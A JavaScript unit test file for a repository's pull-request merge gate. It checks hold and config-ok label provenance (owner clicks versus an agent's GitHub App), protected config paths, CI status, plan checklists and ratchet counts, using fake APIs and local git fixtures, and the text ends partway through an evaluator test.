/* merge-gate.test.mjs — the landing gate's rows as behaviour: pure verdicts (hold and config with provenance from
 * the PR's label events), the ratchets on a merge result, and the evaluator with a fake API and fake merge
 * (docs/plans/2026-10-27-orchestration-redesign.md §4.3; provenance: 2026-11-03-agent-surface-reset.md §4.3), plus
 * the ready receipt ready-gate writes and ship-pr reads (tools/lib/gate-receipt.mjs; its Python hook twin left 2026-11-03).
 *
 * Run: node --test tests/unit/merge-gate.test.mjs
 */
import "../helpers/git-fixture-env.mjs"; // FIRST: scrubs the GIT_DIR & co. a git hook exports (#1807)
import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import {
  REQUIRED_CHECK, CI_APP, HOLD_LABEL, CONFIG_LABEL, ROWS, openVerdict, holdVerdict, configVerdict, planRow, ciVerdict, isConfigPath,
  configFiles, filePaths, configPushState, isProtectedConfigPath, configLabelKind, ratchetsOnMerge, localMergeGenCheck, evaluate, rowLines, main, untrustedEnv, CI_WORKFLOW, TRUSTED_ROWS, ciSuitesFor, ciRetryVerdict, generatedPkgVerdict, retestOnMerge, retestPlan, newerTipPaths, ciRecordedBase, RETEST_MARGIN_MIN, LOCAL_ROWS, RAISE_LABEL, treeCeilingsAt, treeRaises, raiseVerdict, raisesCovered,
} from "../../tools/ci/merge-gate.mjs";
import { parse as parseYAML } from "yaml";
import { planHash } from "../../tools/ci/ready-gate.mjs";
import { AGENT_APP_SLUG, byAgent, byOwner } from "../../tools/ci/lib/provenance.mjs";
import { BOUND_MAX_AGE_MIN, receiptVerdict, writeReceipt, readReceipt, receiptPath, mainCheckout, MAX_AGE_MIN, GATE_FILES, gateFileHashes, gateFilesVerdict, gateClosure, staticImports, MAX_FUTURE_S, headPinProblem } from "../../tools/lib/gate-receipt.mjs";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "..");
const scratch = (prefix) => { const d = path.join(ROOT, "artifacts", "tmp"); fs.mkdirSync(d, { recursive: true }); return fs.mkdtempSync(path.join(d, prefix)); };
const HEAD = "a".repeat(40), TIP = "t".repeat(40);
const sha = (n) => String(n).repeat(40).slice(0, 40);
const GHA = { slug: "github-actions" };
const APP = { id: 1236329, slug: "claude", name: "Claude" };
/** A label event: Bryce's own click unless `app` names the GitHub App that performed it. */
const ev = (name, at, { event = "labeled", app = null, actor = "brycejmurrin" } = {}) => ({ event, label: { name }, actor: { login: actor }, created_at: at, performed_via_github_app: app });

test("openVerdict: only an open, non-draft PR passes", () => {
  assert.equal(openVerdict({ state: "open", draft: false }).ok, true);
  assert.equal(openVerdict({ state: "open", draft: true }).ok, false);
  assert.equal(openVerdict({ state: "closed", merged: true }).ok, false);
  assert.equal(openVerdict(null).ok, false);
});

test("holdVerdict: the `hold` label vetoes, in either API shape, case-insensitively", () => {
  assert.equal(HOLD_LABEL, "hold");
  assert.equal(holdVerdict([]).ok, true);
  assert.equal(holdVerdict([{ name: "priority" }, "land"]).ok, true);
  assert.equal(holdVerdict([{ name: "Hold" }]).ok, false);
  assert.equal(holdVerdict(["hold"]).ok, false);
  assert.equal(holdVerdict(["hold"]).evidence, "the `hold` label is set: whoever set it removes it; one brycejmurrin set, only his own click");
});

test("holdVerdict provenance: a hold Bryce set in person stays held when an agent removes it; an agent's hold may be lifted by anyone; Bryce's own removal always lifts", () => {
  const T1 = "2026-11-03T10:00:00Z", T2 = "2026-11-03T11:00:00Z", T3 = "2026-11-03T12:00:00Z";
  const byAgent = holdVerdict([], [ev("hold", T1), ev("hold", T2, { event: "unlabeled", app: APP })]);
  assert.equal(byAgent.ok, false);
  assert.equal(byAgent.evidence, `hold set by brycejmurrin at ${T1} was not removed by brycejmurrin himself (last unlabel: brycejmurrin via app claude at ${T2}): still held until he removes it`);
  const byBryce = holdVerdict([], [ev("hold", T1, { app: APP }), ev("hold", T2, { event: "unlabeled" })]);
  assert.deepEqual(byBryce, { ok: true, evidence: "no `hold` label (last removed by brycejmurrin)" });
  const agentsOwn = holdVerdict([], [ev("hold", T1, { app: APP }), ev("hold", T2, { event: "unlabeled", app: APP })]);
  assert.deepEqual(agentsOwn, { ok: true, evidence: "no `hold` label (last removed by brycejmurrin via app claude)" }, "an agent lifts a hold an agent set");
  assert.equal(holdVerdict([], [ev("hold", T1), ev("hold", T2, { event: "unlabeled", app: APP }), ev("hold", T3, { event: "unlabeled" })]).ok, true, "Bryce's later removal is the newest unlabel");
  assert.equal(holdVerdict([], [ev("hold", T2, { event: "unlabeled", app: APP }), ev("hold", T1)]).ok, false, "created_at orders the events, not the list");
  assert.equal(holdVerdict([], [ev("hold", T1), ev("hold", T2, { event: "unlabeled", actor: "someone-else" })]).ok, false, "another login's removal of Bryce's hold is not his");
  assert.equal(holdVerdict([], [ev("hold", T1, { app: APP }), ev("hold", T2, { event: "unlabeled" }), ev("hold", T3)]).ok, false, "Bryce's hold at T3 has no later unlabel of his own: held (fail closed on a missing event)");
  const T4 = "2026-11-03T13:00:00Z";
  assert.equal(holdVerdict([], [ev("hold", T1), ev("hold", T2, { event: "unlabeled", actor: "x" }), ev("hold", T3, { actor: "x" }), ev("hold", T4, { event: "unlabeled", actor: "x" })]).ok, false,
    "a re-label and unlabel by someone else after an agent's removal does not lift Bryce's hold");
  assert.equal(holdVerdict([], [ev("hold", T1), ev("hold", T2, { event: "unlabeled", app: APP }), ev("hold", T3, { app: APP }), ev("hold", T4, { event: "unlabeled", app: APP })]).ok, false, "the same through the app");
  assert.equal(holdVerdict([], [ev("hold", T1), ev("hold", T2, { event: "unlabeled" }), ev("hold", T3, { app: APP }), ev("hold", T4, { event: "unlabeled", app: APP })]).ok, true, "Bryce lifted his hold; the agent's later hold is the agent's to lift");
  assert.equal(holdVerdict([], [ev("hold", T1), { ...ev("hold", T2, { event: "unlabeled" }), performed_via_github_app: undefined }]).ok, false, "an unlabel without the app field is not his");
  assert.equal(holdVerdict([], [ev("other", T2, { event: "unlabeled", app: APP })]).ok, true, "another label's events do not count");
  assert.equal(holdVerdict(["hold"], [ev("hold", T2, { event: "unlabeled" })]).ok, false, "the label present always holds");
  assert.equal(holdVerdict([], null).ok, true, "no events (pure callers): the label alone decides");
});

test("configVerdict: a diff touching a config path needs `config-ok` last added by Bryce in person; any other diff passes", () => {
  assert.equal(CONFIG_LABEL, "config-ok");
  for (const p of [".claude/hooks/bash-guard.sh", ".claude/settings.json", ".github/workflows/dispatch.yml", ".githooks/pre-commit", "./.claude/hooks/x.py",
    ".claude/settings.local.json", "tools/ci/merge-gate.mjs", "tools/ci/lib/provenance.mjs", ".github/actions/setup/action.yml", ".mcp.json", "tools/hooks/readonly-bash.sh", "tools/mcp/apex-extras.mjs",
    "tools/lib/generated-paths.mjs", "package.json", ".cursor/hooks.json", ".codex/hooks.json", ".claude/agents/worker.md", ".claude/memory/MEMORY.md", ".github/ISSUE_TEMPLATE/task.yml", "tools/lib/cli-args.mjs", "tools/gen/gen-test-groups.mjs"]) assert.equal(isConfigPath(p), true, p);
  for (const p of [".claude/skills/steward/SKILL.md", ".github/labels.json", "js/game.js", ".claude/rules/claude-config.md", "desktop/package.json", "tools/lib/git-run.mjs"]) assert.equal(isConfigPath(p), false, p);
  assert.deepEqual(filePaths([{ filename: "docs/TESTING.md", previous_filename: ".claude/hooks/bash-guard.sh" }, { filename: "js/a.js" }]), ["docs/TESTING.md", ".claude/hooks/bash-guard.sh", "js/a.js"], "a rename counts by both names");
  assert.deepEqual(configFiles(["docs/a.md", ".githooks/pre-push", "js/a.js"]), [".githooks/pre-push"]);
  const T1 = "2026-11-03T10:00:00Z", T2 = "2026-11-03T11:00:00Z";
  assert.deepEqual(configVerdict(["docs/TESTING.md", "js/game.js"], [], null), { ok: true, evidence: "no config path (harness, CI tools, agent config) in the diff (2 file(s))" });
  const files = [".github/workflows/dispatch.yml", "js/game.js"];
  assert.deepEqual(configVerdict(files, [], []), { ok: false, evidence: "needs config-ok from brycejmurrin: the diff edits .github/workflows/dispatch.yml" });
  assert.deepEqual(configVerdict(files, ["config-ok"], []),
    { ok: false, evidence: "needs config-ok from brycejmurrin: the label was found but its label event was not — only his own click, or an agent's (claude app) on routine paths, counts (the diff edits .github/workflows/dispatch.yml)" });
  assert.deepEqual(configVerdict(files, [{ name: "config-ok" }], [ev("config-ok", T1)]), { ok: true, evidence: `config-ok by owner (brycejmurrin) at ${T1} covers .github/workflows/dispatch.yml` });
  assert.equal(configVerdict(files, ["config-ok"], [ev("config-ok", T1), ev("config-ok", T2, { event: "unlabeled" }), ev("config-ok", "2026-11-03T12:00:00Z", { app: APP })]).ok, false, "Bryce's old click does not cover an agent's re-add after his own removal");
  const many = configVerdict([".claude/hooks/a.sh", ".claude/hooks/b.sh", ".claude/hooks/c.sh", ".claude/hooks/d.sh", ".claude/hooks/e.sh"], [], []);
  assert.equal(many.evidence, "needs config-ok from brycejmurrin: the diff edits .claude/hooks/a.sh, .claude/hooks/b.sh, .claude/hooks/c.sh, .claude/hooks/d.sh, …; protected path(s), his own tap only: .claude/hooks/a.sh, .claude/hooks/b.sh, .claude/hooks/c.sh, .claude/hooks/d.sh, …");
  const ok = [ev("config-ok", T1)];
  assert.equal(configVerdict(files, ["config-ok"], ok, "brycejmurrin", { state: "covered", evidence: "x" }).ok, true);
  assert.deepEqual(configVerdict(files, ["config-ok"], ok, "brycejmurrin", { state: "after", evidence: "a push touching .claude/hooks/a.sh came" }),
    { ok: false, evidence: `needs a fresh config-ok: a push touching .claude/hooks/a.sh came after the label at ${T1} (config-ok by owner (brycejmurrin; remove and re-add it)` });
  assert.equal(configVerdict(files, ["config-ok"], ok, "brycejmurrin", { state: "unknown", evidence: "x" }).pending, true);
});

test("configVerdict (#5455): an agent's config-ok covers ROUTINE config paths only; protected paths need Bryce's own tap", () => {
  const T1 = "2026-11-03T10:00:00Z", T2 = "2026-11-03T11:00:00Z", T3 = "2026-11-03T12:00:00Z";
  const L = ["config-ok"];
  const agent = (at, o) => ev("config-ok", at, { app: APP, ...o });
  const routine = [".github/workflows/dispatch.yml", "package.json", "tools/ci/dispatch.mjs", "js/game.js"];
  const prot = [".github/workflows/land.yml", "tools/ci/dispatch.mjs"];
  // 1. Bryce's own tap on a protected diff passes.
  assert.deepEqual(configVerdict(prot, L, [ev("config-ok", T1)]), { ok: true, evidence: `config-ok by owner (brycejmurrin) at ${T1} covers .github/workflows/land.yml, tools/ci/dispatch.mjs` });
  // 2. An agent's label on a protected diff is refused and names the protected paths.
  assert.deepEqual(configVerdict(prot, L, [agent(T1)]),
    { ok: false, evidence: "needs config-ok from brycejmurrin himself: an agent's label (brycejmurrin via app claude) covers routine config paths only, and the diff edits protected path(s) .github/workflows/land.yml" });
  for (const p of ["tools/ci/merge-gate.mjs", "tools/ci/lib/provenance.mjs", "tools/ci/ready-gate.mjs", ".claude/hooks/x.sh", ".claude/settings.json", ".claude/settings.local.json",
    "tools/hooks/readonly-bash.sh", ".githooks/pre-push", ".cursor/hooks.json", ".codex/hooks.json"]) assert.equal(configVerdict([p], L, [agent(T1)]).ok, false, `${p} is protected`);
  assert.equal(configVerdict(["docs/a.md", "x", ".claude/hooks/a.sh"].concat(routine), L, [agent(T1)]).ok, false, "one protected path needs his tap for the whole row");
  // 3. An agent's label on a routine-only diff passes, and says so.
  assert.deepEqual(configVerdict(routine, L, [agent(T1)]),
    { ok: true, evidence: `config-ok by agent (claude app), routine paths only (brycejmurrin via app claude) at ${T1} covers .github/workflows/dispatch.yml, package.json, tools/ci/dispatch.mjs` });
  // ci.yml decides what green means: protected (Bryce, 2026-11-11 "Protect ci.yml").
  assert.equal(configVerdict([".github/workflows/ci.yml", "js/a.js"], L, [agent(T1)]).ok, false, "an agent's label on ci.yml is refused");
  assert.match(configVerdict([".github/workflows/ci.yml"], L, [agent(T1)]).evidence, /protected path\(s\) \.github\/workflows\/ci\.yml/);
  assert.equal(configVerdict([".github/workflows/ci.yml"], L, [ev("config-ok", T1)]).ok, true, "his own tap on ci.yml passes");
  for (const p of [".github/workflows/pages.yml", ".claude/agents/worker.md", ".claude/memory/MEMORY.md", ".mcp.json", "tools/mcp/apex-extras.mjs", "tools/lib/generated-paths.mjs", ".github/actions/setup/action.yml", ".github/ISSUE_TEMPLATE/task.yml"])
    assert.equal(configVerdict([p], L, [agent(T1)]).ok, true, `${p} is routine`);
  // 4. An agent's label older than the last config push is refused (the same timing rule as Bryce's).
  const stale = configVerdict(routine, L, [agent(T1)], "brycejmurrin", { state: "after", evidence: "a push touching tools/ci/dispatch.mjs came" });
  assert.equal(stale.ok, false);
  assert.match(stale.evidence, /^needs a fresh config-ok: a push touching tools\/ci\/dispatch\.mjs came after the label at .* by agent \(claude app\), routine paths only/);
  assert.equal(configVerdict(routine, L, [agent(T1)], "brycejmurrin", { state: "unknown", evidence: "x" }).pending, true);
  // 5. Bryce's own unlabel after an agent's label refuses, and voids a later agent re-add until his own.
  assert.equal(configVerdict(routine, [], [agent(T1), ev("config-ok", T2, { event: "unlabeled" })]).ok, false, "label gone");
  const vetoed = configVerdict(routine, L, [agent(T1), ev("config-ok", T2, { event: "unlabeled" }), agent(T3)]);
  assert.equal(vetoed.ok, false);
  assert.match(vetoed.evidence, /he removed it himself at 2026-11-03T11:00:00Z/);
  assert.equal(configVerdict(routine, L, [ev("config-ok", T2, { event: "unlabeled" }), agent(T3), ev("config-ok", T1)]).ok, false, "created_at orders the walk, not the list");
  assert.equal(configVerdict(routine, L, [ev("config-ok", T1, { event: "unlabeled" }), ev("config-ok", T2), agent(T3)]).ok, true, "his own re-add lifts his veto");
  assert.equal(configVerdict(routine, L, [agent(T1), agent(T2, { event: "unlabeled" }), agent(T3)]).ok, true, "an agent's own removal vetoes nothing");
  // 6. An event from any other app slug is refused.
  for (const app of [{ slug: "copilot-swe-agent" }, { slug: "github-actions" }, { slug: "Claude" }, { name: "claude" }, {}])
    assert.equal(configVerdict(routine, L, [ev("config-ok", T1, { app })]).ok, false, JSON.stringify(app));
  assert.equal(configVerdict(routine, L, [ev("config-ok", T1, { app: APP, actor: "someone-else" })]).ok, false, "another login through the claude app");
  // 7. An event with no performed_via_github_app field is refused.
  const { performed_via_github_app: _, ...noField } = ev("config-ok", T1);
  assert.equal(configVerdict(routine, L, [noField]).ok, false);
  assert.equal(configVerdict(prot, L, [noField]).ok, false);
  assert.equal(byAgent(noField), false);
  assert.equal(byAgent(agent(T1)), true);
  assert.equal(byOwner(agent(T1)), false, "byOwner is unchanged: an app event is never the owner's");
  assert.equal(AGENT_APP_SLUG, "claude");
  assert.deepEqual([configLabelKind(ev("config-ok", T1)), configLabelKind(agent(T1)), configLabelKind(agent(T1, { event: "unlabeled" })), configLabelKind(noField)], ["owner", "agent", null, null]);
});

test("PROTECTED_CONFIG_PATH covers every module in the gate's import closure, inside tools/ci/ and outside it (#5467; a module's top level runs at import)", () => {
  const seen = new Set(gateClosure(ROOT));   // the same walk the gate receipt hashes (tools/lib/gate-receipt.mjs)
  assert.ok(seen.has("tools/ci/lib/provenance.mjs"), "provenance is in the closure");
  assert.ok(seen.has("tools/ci/github-api.mjs") && seen.size >= 8, [...seen].join(", "));
  for (const f of ["tools/gen/gen-test-groups.mjs", "tools/lib/cli-args.mjs", "tools/lib/gate-receipt.mjs"]) assert.ok(seen.has(f), `${f} is in the closure`);
  const notConfig = [...seen].filter((f) => !isConfigPath(f));
  assert.deepEqual(notConfig, [], "a gate module a PR could change with no config-ok at all");
  const notProtected = [...seen].filter((f) => !isProtectedConfigPath(f));
  assert.deepEqual(notProtected, [], "a gate module an agent's config-ok could approve");
  for (const f of seen) if (isProtectedConfigPath(f)) assert.equal(isConfigPath(f), true, `${f}: protected implies config`);
  assert.equal(isConfigPath("tools/lib/cli-args.mjs.bak"), false, "anchored: a sibling file is not swept in");
});

test("configPushState: config-ok binds to the pushes made before it; a later push touching a config path needs a fresh label", () => {
  const H0 = "0".repeat(40), H1 = "1".repeat(40), H2 = "2".repeat(40);
  const run = (sha, at, pr = 7) => ({ head_sha: sha, created_at: at, pull_requests: [{ number: pr }] });
  const mk = (runs, cmp) => (p) => p.startsWith("actions/workflows/ci.yml/runs?event=pull_request&branch=cursor%2Fx") ? { json: { workflow_runs: runs } }
    : p.startsWith("compare/") ? (cmp ? { json: { files: cmp } } : { error: "HTTP 404" }) : { error: `unexpected ${p}` };
  const at = (h) => `2026-11-03T${String(h).padStart(2, "0")}:00:00Z`;
  const q = (runs, cmp, head = H2) => configPushState({ pr: 7, head, headRef: "cursor/x", labelAt: at(10), request: mk(runs, cmp) }).state;
  assert.equal(q([run(H0, at(8)), run(H2, at(9))]), "covered", "labelled after the head was pushed");
  assert.equal(q([run(H0, at(8)), run(H2, at(11))], [{ filename: "js/a.js" }]), "covered", "a later push touching no config path");
  assert.equal(q([run(H0, at(8)), run(H2, at(11))], [{ filename: "js/a.js", previous_filename: ".claude/hooks/x.sh" }]), "after", "a later rename of a hook");
  assert.equal(q([run(H0, at(8)), run(H2, at(11))], [{ filename: "tools/ci/merge-gate.mjs" }]), "after");
  assert.equal(q([run(H0, at(8)), run(H2, at(11))], null), "unknown", "compare unreadable");
  assert.equal(q([run(H2, at(11))]), "after", "no run before the label");
  assert.equal(q([run(H0, at(8)), run(H2, at(9), 99)]), "unknown", "another PR's run on the head does not date this PR's push");
  assert.equal(q([run(H0, at(8)), run(H1, at(9))]), "unknown", "no run on the head yet");
});

test("planRow: open items refuse, a `land:` item is exempt, no Plan fails except on a fold bot's PR", () => {
  assert.equal(planRow("## Plan\n- [x] done\n- [ ] land: flip ready, add `land`\n").ok, true);
  const open = planRow("## Plan\n- [x] done\n- [ ] write the test\n- [ ] READY to ORCH A\n");
  assert.equal(open.ok, false);
  assert.ok(open.evidence.includes("1 of 3") && open.evidence.includes('"write the test"'), "an older `READY to` item is still exempt: " + open.evidence);
  assert.equal(planRow("## Goal\nx\n").ok, false, "an agent PR carries a Plan (skill steward §Open)");
  assert.equal(planRow("", "brycejmurrin").ok, false);
  assert.deepEqual(planRow("fold", "github-actions[bot]"), { ok: true, evidence: "no ## Plan checklist in the body (a fold bot's PR)" });
});

test("#5404: an open `**now:**` item still refuses the plan row (no exemption), and the refusal names the cure", () => {
  // PR #5368 at f2f03ea: refused on "1 of 10 Plan item(s) open: **now:** ready CI on f2f03ea; the gate re-decides".
  const r = planRow("## Plan\n- [x] a\n- [ ] **now:** ready CI on f2f03ea; the gate re-decides\n- [ ] land: add `land`\n");
  assert.equal(r.ok, false, "option (a): the gate is unchanged, a `now:` item is open");
  assert.equal(r.evidence.split("; ").at(-1), "the `**now:**` item counts: at the ready flip tick it with its evidence, or move what is left of it into the `land:` item (skill steward §Land)");
  // The cure passes: what is left lives in the gate-exempt land item.
  assert.equal(planRow("## Plan\n- [x] a\n- [ ] land: ready CI on f2f03ea; the gate re-decides, then `land`\n").ok, true);
  // No `now:` among the open items: no hint.
  assert.equal(planRow("## Plan\n- [ ] write the test\n").evidence, '1 of 1 Plan item(s) open: "write the test" — tick each with its evidence or strike it with why');
});

test("ciVerdict: the required check-run on the head, newest attempt, success only", () => {
  assert.equal(REQUIRED_CHECK, "CI");
  assert.equal(ciVerdict([]).ok, false);
  assert.equal(ciVerdict([{ id: 1, name: "CI (draft fast tier)", status: "completed", conclusion: "success" }]).ok, false);
  assert.equal(ciVerdict([{ id: 1, name: "CI", app: GHA, status: "in_progress" }]).ok, false);
  assert.equal(ciVerdict([{ id: 1, name: "CI", app: GHA, status: "completed", conclusion: "failure" }, { id: 2, name: "CI", app: GHA, status: "completed", conclusion: "success" }]).ok, true, "newest attempt wins");
  assert.equal(ciVerdict([{ id: 2, name: "CI", app: GHA, status: "completed", conclusion: "success" }, { id: 3, name: "CI", app: GHA, status: "completed", conclusion: "failure" }]).ok, false);
});

// The assert-match ratchet counts the literal text of the pin, so the fixtures spell it from parts.
const PIN = ["assert", "match"].join(".");
const OVER = "over a ratchet on the merge result: ";
const NEVER_RAISE = " — convert the pins or extract, never raise the ceiling for someone else's overage";

test("ratchetsOnMerge: every count check runs on the merge result against the tip; an overage names its sites; a check that cannot run fails", () => {
  const out = (status, stdout = "", extra = {}) => ({ status, stdout, stderr: "", ...extra });
  const seen = [];
  const runWith = (byScript) => (cmd, argv, o) => { seen.push([argv, o.env]); return byScript[argv[0] === "--test" ? argv[1] : "ratchets"] || byScript.tests; };
  assert.deepEqual(ratchetsOnMerge({ run: runWith({ ratchets: out(0), tests: out(0) }) }), { ok: true, evidence: "ratchets.mjs and the whole-tree count tests hold on the merge result" });
  assert.deepEqual(seen.map(([a]) => a.at(-1)), ["tools/check/ratchets.mjs", ...["assert-match-ratchet", "source-pin-hygiene", "vm-filename-lint", "test-groups", "docs-integrity", "output-surface"].map((f) => `tests/unit/${f}.test.mjs`)]);
  assert.ok(seen.every(([, env]) => env.APEX_RATCHET_BASE_REF === "HEAD" && !("NODE_TEST_CONTEXT" in env) && !("APEX_RATCHET_ABSOLUTE" in env)));
  const pinFail = out(1, `error: '7317 ${PIN} sites (ceiling 7316) — convert a source pin'`);
  const both = ratchetsOnMerge({ run: runWith({ ratchets: out(1, "css/hud.css codeLines 2300 > 2279"), tests: out(0), "tests/unit/assert-match-ratchet.test.mjs": pinFail }) });
  assert.equal(both.evidence, `${OVER}ratchets.mjs: css/hud.css codeLines 2300 > 2279; assert-match ceiling: 7317 ${PIN} sites (ceiling 7316)${NEVER_RAISE}`, "both overages, not just the first");
  assert.deepEqual(ratchetsOnMerge({ run: runWith({ ratchets: out(null, "", { error: new Error("spawn ENOENT") }), tests: out(0) }) }), { ok: false, evidence: `${OVER}ratchets.mjs: spawn ENOENT${NEVER_RAISE}` });
});

test("two PRs each at the assert-match ceiling alone are over it on the merge result (#3236 + #3237, 2026-10-20)", () => {
  const T = scratch("merge-gate-shape-");
  const git = (cwd, ...a) => { const r = spawnSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", ...a], { cwd, encoding: "utf8" }); assert.equal(r.status, 0, `${a.join(" ")}: ${r.stderr}`); return r.stdout.trim(); };
  const write = (root, rel, text) => { fs.mkdirSync(path.dirname(path.join(root, rel)), { recursive: true }); fs.writeFileSync(path.join(root, rel), text); };
  const pins = (n) => Array.from({ length: n }, () => `${PIN}(a, /b/);`).join("\n") + "\n";
  try {
    const remote = path.join(T, "remote.git"), W = path.join(T, "w");
    git(T, "init", "-q", "--bare", remote); git(T, "clone", "-q", remote, W); git(W, "checkout", "-q", "-b", "deploy-x");
    const UNIT = "tests/unit";   // built, not spelled: the path-reference lint reads no phantom file
    for (const rel of [`${UNIT}/assert-match-ratchet.test.mjs`, "tools/check/ratchets.mjs"]) write(W, rel, fs.readFileSync(path.join(ROOT, rel), "utf8"));
    write(W, "tests/data/ratchets.json", JSON.stringify({ files: {}, tree: { assertPins: 3 } }) + "\n");
    write(W, `${UNIT}/base.test.mjs`, pins(2));
    // This fixture isolates ratchet composition; a scenery catalog build that succeeds stands in for the preceding gen row.
    write(W, "tools/gen/ensure-built.mjs", "process.exit(0);\n");
    git(W, "add", "-A"); git(W, "commit", "-q", "-m", "base: 2 pins, ceiling 3"); git(W, "push", "-q", "origin", "deploy-x");
    for (const [name, file] of [["pr1", "one.test.mjs"], ["pr2", "two.test.mjs"]]) {   // each adds one pin: 3 of 3 alone
      git(W, "checkout", "-q", "-b", name, "deploy-x"); write(W, `${UNIT}/${file}`, pins(1));
      git(W, "add", "-A"); git(W, "commit", "-q", "-m", `${name}: one pin`); git(W, "push", "-q", "origin", name);
    }
    const head2 = git(W, "rev-parse", "pr2");
    const gate = () => localMergeGenCheck({ pr: 2, head: head2, headRef: "pr2", cwd: W, base: "deploy-x",
      run: (cmd, argv, o) => (cmd === "npm" || (argv[0] === "--test" && !argv[1].endsWith("assert-match-ratchet.test.mjs")) ? { status: 0, stdout: "", stderr: "" } : spawnSync(cmd, argv, o)) });
    const alone = gate();
    assert.equal(alone.ok && alone.ratchets.ok, true, `pr2 alone is at the ceiling, not over it: ${alone.evidence} / ${alone.ratchets?.evidence}`);
    git(W, "checkout", "-q", "deploy-x"); git(W, "merge", "-q", "--no-ff", "-m", "merge pr1", "pr1"); git(W, "push", "-q", "origin", "deploy-x");
    const together = gate();
    assert.equal(together.ok, true, "the merge and gen:check are fine: only the ratchet row sees the overage");
    assert.equal(together.ratchets.ok, false, "pr2 adds the 4th pin onto a tip already at 3");
    assert.ok(/assert-match ceiling: 4 pin-shaped asserts \(ceiling 3; base 3\/3\)/.test(together.ratchets.evidence), together.ratchets.evidence);
  } finally { fs.rmSync(T, { recursive: true, force: true }); }
});

test("localMergeGenCheck: a gen:check failure and a conflict each return the fetched tip with the refusal (2026-10-27 23:20Z)", () => {
  const T = scratch("merge-gate-tip-");
  const git = (cwd, ...a) => { const r = spawnSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", ...a], { cwd, encoding: "utf8" }); assert.equal(r.status, 0, `${a.join(" ")}: ${r.stderr}`); return r.stdout.trim(); };
  const write = (root, rel, text) => { fs.mkdirSync(path.dirname(path.join(root, rel)), { recursive: true }); fs.writeFileSync(path.join(root, rel), text); };
  try {
    const remote = path.join(T, "remote.git"), W = path.join(T, "w");
    git(T, "init", "-q", "--bare", remote); git(T, "clone", "-q", remote, W); git(W, "checkout", "-q", "-b", "deploy-x");
    write(W, "docs/a.md", "base\n"); git(W, "add", "-A"); git(W, "commit", "-q", "-m", "base"); git(W, "push", "-q", "origin", "deploy-x");
    git(W, "checkout", "-q", "-b", "pr", "deploy-x"); write(W, "docs/a.md", "pr\n"); git(W, "add", "-A"); git(W, "commit", "-q", "-m", "the PR"); git(W, "push", "-q", "origin", "pr");
    const head = git(W, "rev-parse", "pr"), tip = git(W, "rev-parse", "deploy-x");
    const gate = (run) => localMergeGenCheck({ pr: 3, head, headRef: "pr", cwd: W, base: "deploy-x", run, ratchets: () => assert.fail("no ratchets after a refusal") });
    const gen = gate((cmd) => (cmd === "npm" ? { status: 1, stdout: "docs/agent-index.json is stale: run npm run gen", stderr: "" } : assert.fail(`unexpected ${cmd}`)));
    assert.equal(gen.ok, false);
    assert.equal(gen.error, undefined, "a refusal, not a git error");
    assert.equal(gen.tip, tip, "the tip is known once fetched: land.yml compares it with the deploy tip at post time");
    assert.ok(gen.evidence.startsWith(`gen:check fails on the merge onto ${tip.slice(0, 8)}: docs/agent-index.json is stale`), gen.evidence);
    git(W, "checkout", "-q", "deploy-x"); write(W, "docs/a.md", "tip\n"); git(W, "add", "docs/a.md"); git(W, "commit", "-q", "-m", "tip edits the same line"); git(W, "push", "-q", "origin", "deploy-x");
    const moved = git(W, "rev-parse", "deploy-x");
    const conflict = gate(() => assert.fail("gen:check never runs on a conflict"));
    assert.equal(conflict.ok, false);
    assert.equal(conflict.tip, moved);
    assert.ok(conflict.evidence.startsWith(`conflicts with the current tip ${moved.slice(0, 8)}: docs/a.md`), conflict.evidence);
  } finally { fs.rmSync(T, { recursive: true, force: true }); }
});

/** A fake GitHub plus fake merge for the evaluator; `pull`, `checks`, `events` and `files` are mutable per case. */
function fakes() {
  const pull = { state: "open", draft: false, labels: [], user: { login: "brycejmurrin" }, head: { sha: HEAD, ref: "cursor/x" }, base: { ref: "deploy-x" }, body: "## Plan\n- [x] done\n- [ ] land: flip + label\n" };
  const prRuns = [{ head_sha: HEAD, created_at: "2026-11-03T09:00:00Z", pull_requests: [{ number: 7 }] }];
  const checks = [{ id: 1, name: "Structural guards", status: "completed", conclusion: "success" }, { id: 2, name: "CI", app: GHA, status: "completed", conclusion: "success", check_suite: { id: 50 } }];
  const runs = [{ id: 500, check_suite_id: 50, path: ".github/workflows/ci.yml", created_at: "2026-11-03T09:01:00Z" }];
  const events = [], files = [{ filename: "js/game.js" }, { filename: "docs/TESTING.md" }];
  const calls = [];
  const request = (p) => {
    if (p === "pulls/7") return { json: pull };
    if (p.startsWith("issues/7/events")) return { json: events };
    if (p.startsWith("pulls/7/files")) return { json: files };
    if (p === "branches/deploy-x") return { json: { commit: { sha: TIP } } };
    if (p.startsWith("commits/")) return { json: { check_runs: checks, total_count: checks.length } };
    if (p.startsWith(`actions/workflows/ci.yml/runs?head_sha=${HEAD}`)) return { json: { workflow_runs: runs, total_count: runs.length } };
    if (p.startsWith("actions/workflows/ci.yml/runs?event=pull_request&branch=cursor%2Fx")) return { json: { workflow_runs: prRuns } };
    return { error: `unexpected ${p}` };
  };
  const localMerge = (a) => { calls.push(a); return { ok: true, evidence: "merges clean", tip: TIP, ratchets: { ok: true, evidence: "hold" }, retest: a.ciAt === null ? null : { ok: true, evidence: "no tip merge since the CI run" } }; };
  return { pull, checks, runs, prRuns, events, files, calls, deps: { request, root: "/nowhere", localMerge } };
}

test("evaluate: all rows in order; each failing row refuses on its own; the local rows wait for an open PR; API errors are errors, not rows", () => {
  const f = fakes();
  const v = evaluate({ pr: 7, ...f.deps });
  assert.equal(v.ok, true, JSON.stringify(v.rows));
  assert.deepEqual(Object.keys(v.rows), ROWS);
  assert.deepEqual([v.head, v.base, v.tip], [HEAD, "deploy-x", TIP]);
  assert.deepEqual(f.calls[0], { pr: 7, head: HEAD, headRef: "cursor/x", cwd: "/nowhere", base: "deploy-x", ciAt: "2026-11-03T09:01:00Z", ciBase: "" }, "the merge targets the PR's own base, and the re-test compares against the green CI run's creation");
  f.pull.labels = [{ name: "hold" }];
  assert.deepEqual(ROWS.filter((k) => !evaluate({ pr: 7, ...f.deps }).rows[k].ok), ["hold"]);
  f.pull.labels = []; f.pull.body = "## Plan\n- [ ] still open\n";
  assert.deepEqual(ROWS.filter((k) => !evaluate({ pr: 7, ...f.deps }).rows[k].ok), ["plan"]);
  f.pull.body = "";
